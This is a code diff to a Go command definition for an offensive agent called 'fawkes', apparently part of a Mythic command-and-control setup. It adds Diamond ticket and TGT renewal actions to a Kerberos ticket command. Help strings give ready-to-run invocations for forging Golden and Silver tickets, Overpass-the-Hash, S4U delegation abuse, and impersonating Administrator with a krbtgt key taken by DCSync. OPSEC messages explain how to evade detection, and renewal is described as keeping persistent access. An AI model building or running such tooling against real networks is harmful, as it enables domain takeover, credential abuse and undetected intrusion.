@@ -11,11 +11,11 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "ticket",
-		Description:         "Forge, request, or delegate Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). S4U: Constrained delegation abuse via S4U2Self+S4U2Proxy. Outputs kirbi or ccache format.",
-		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_key> -key_type rc4 -format ccache\nticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <hex_key> -spn MSSQLSvc/db01.corp.local:1433\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local",
+		Description:         "Forge, request, renew, or delegate Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). S4U: Constrained delegation abuse via S4U2Self+S4U2Proxy. Diamond: Real AS exchange + ticket modification (evasion). Renew: Extend TGT lifetime. Outputs kirbi or ccache format.",
+		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action diamond -realm CORP.LOCAL -username jsmith -key <user_key> -krbtgt_key <krbtgt_key> -server dc01.corp.local -target_user Administrator\nticket -action renew -realm CORP.LOCAL -server dc01.corp.local -ticket <base64_kirbi>\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local",
 		Version:             1,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1550.003", "T1134.001"},
+		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1550.003", "T1134.001", "T1550.001"},
 		AssociatedBrowserScript: &agentstructs.BrowserScript{
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "ticket_new.js"),
 			Author:     "@galoryber",
@@ -32,9 +32,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash AS exchange with KDC), s4u (constrained delegation abuse via S4U2Self+S4U2Proxy)",
+				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash), diamond (real AS exchange + modification), renew (extend TGT lifetime), s4u (constrained delegation)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"forge", "request", "s4u"},
+				Choices:          []string{"forge", "request", "s4u", "diamond", "renew"},
 				DefaultValue:     "forge",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -174,6 +174,61 @@ func init() {
 					{ParameterIsRequired: false, GroupName: "Default"},
 				},
 			},
+			{
+				Name:             "krbtgt_key",
+				CLIName:          "krbtgt_key",
+				ModalDisplayName: "Krbtgt Key (hex)",
+				Description:      "Diamond: hex-encoded krbtgt key for decrypting/re-encrypting the TGT (from DCSync or hashdump)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "krbtgt_key_type",
+				CLIName:          "krbtgt_key_type",
+				ModalDisplayName: "Krbtgt Key Type",
+				Description:      "Diamond: krbtgt key encryption type — aes256 (default), aes128, rc4/ntlm",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "aes256",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "target_user",
+				CLIName:          "target_user",
+				ModalDisplayName: "Target User (Diamond)",
+				Description:      "Diamond: user identity to embed in the modified ticket (e.g., Administrator). Defaults to username if not set.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "target_rid",
+				CLIName:          "target_rid",
+				ModalDisplayName: "Target RID (Diamond)",
+				Description:      "Diamond: RID for the target user (default: 500 for Administrator)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     500,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "ticket",
+				CLIName:          "ticket",
+				ModalDisplayName: "Ticket (base64)",
+				Description:      "Renew: base64-encoded kirbi ticket to renew. Must be a renewable TGT.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -192,6 +247,11 @@ func init() {
 				msg += " Golden/Silver ticket forgery creates tickets without KDC interaction but forged tickets may have anomalous flags or lifetimes detectable by PAC validation."
 			case "request":
 				msg += " Overpass-the-Hash generates AS-REQ with pre-auth — indistinguishable from normal auth but encryption downgrade (RC4) is a detection signal."
+			case "diamond":
+				targetUser, _ := taskData.Args.GetStringArg("target_user")
+				msg = fmt.Sprintf("OPSEC WARNING: Diamond Ticket (T1558.001). Real AS exchange for auth user, then ticket modification to impersonate %s. Generates legitimate 4768 event but PAC is stripped — services with strict PAC validation may reject. Harder to detect than Golden Ticket due to real KDC interaction.", targetUser)
+			case "renew":
+				msg += " TGT renewal generates TGS-REQ with RENEW flag — event 4769 logged. Maintains persistent Kerberos access without re-authenticating."
 			case "s4u":
 				impersonate, _ := taskData.Args.GetStringArg("impersonate")
 				spn, _ := taskData.Args.GetStringArg("spn")
@@ -225,11 +285,22 @@ func init() {
 			server, _ := taskData.Args.GetStringArg("server")
 			impersonate, _ := taskData.Args.GetStringArg("impersonate")
 
+			targetUser, _ := taskData.Args.GetStringArg("target_user")
+
 			var displayMsg, artifactMsg string
 			switch action {
 			case "request":
 				displayMsg = fmt.Sprintf("Overpass-the-Hash: %s@%s via %s", username, realm, server)
 				artifactMsg = fmt.Sprintf("Kerberos AS-REQ (Overpass-the-Hash) for %s@%s to %s", username, realm, server)
+			case "diamond":
+				if targetUser == "" {
+					targetUser = username
+				}
+				displayMsg = fmt.Sprintf("Diamond Ticket: auth=%s → target=%s@%s via %s", username, targetUser, realm, server)
+				artifactMsg = fmt.Sprintf("Diamond Ticket AS-REQ for %s@%s, modifying to %s via %s", username, realm, targetUser, server)
+			case "renew":
+				displayMsg = fmt.Sprintf("Renew TGT for %s@%s via %s", username, realm, server)
+				artifactMsg = fmt.Sprintf("Kerberos TGS-REQ (RENEW) for %s@%s to %s", username, realm, server)
 			case "s4u":
 				displayMsg = fmt.Sprintf("S4U delegation: %s → %s for %s via %s", username, impersonate, spn, server)
 				artifactMsg = fmt.Sprintf("Kerberos S4U2Self+S4U2Proxy: %s impersonating %s for %s to %s", username, impersonate, spn, server)
@@ -269,6 +340,23 @@ func init() {
 				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
 					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
 						"Overpass-the-Hash TGT obtained (T1550.002)")
+				}
+			case "diamond":
+				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Diamond Ticket forged") {
+					targetUser, _ := processResponse.TaskData.Args.GetStringArg("target_user")
+					username, _ := processResponse.TaskData.Args.GetStringArg("username")
+					if targetUser == "" {
+						targetUser = username
+					}
+					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
+						fmt.Sprintf("Diamond Ticket forged: auth=%s, target=%s (T1558.001)", username, targetUser))
+					logOperationEvent(processResponse.TaskData.Task.ID,
+						fmt.Sprintf("[DIAMOND] Real AS exchange for %s, ticket modified to %s", username, targetUser), true)
+				}
+			case "renew":
+				if strings.Contains(responseText, "renewed") || strings.Contains(responseText, "Renewed") || strings.Contains(responseText, "success") {
+					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
+						"Kerberos TGT renewed — persistent access maintained")
 				}
 			case "s4u":
 				impersonate, _ := processResponse.TaskData.Args.GetStringArg("impersonate")
